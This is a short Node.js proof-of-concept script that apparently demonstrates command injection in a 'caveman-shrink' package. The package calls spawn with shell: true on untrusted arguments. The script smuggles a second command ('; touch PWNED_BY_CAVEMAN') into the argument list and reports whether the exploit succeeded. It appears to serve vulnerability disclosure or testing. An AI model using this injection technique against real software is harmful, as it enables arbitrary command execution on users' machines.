const { spawn } = require('child_process');
const fs = require('fs');

// Simulate the vulnerable call in caveman-shrink/index.js:145
// const upstream = spawn(args[0], args.slice(1), getSpawnOptions());

// On Windows, getSpawnOptions() returns { shell: true }
// Here we use { shell: true } to demonstrate the impact.

const args = ['echo', 'VULNERABLE', ';', 'touch', 'PWNED_BY_CAVEMAN'];

console.log('Attacker-controlled args:', args.slice(1));
const p = spawn(args[0], args.slice(1), { shell: true });

p.on('exit', () => {
    if (fs.existsSync('PWNED_BY_CAVEMAN')) {
        console.log('EXPLOIT SUCCESSFUL');
        process.exit(0);
    } else {
        console.log('EXPLOIT FAILED');
        process.exit(1);
    }
});
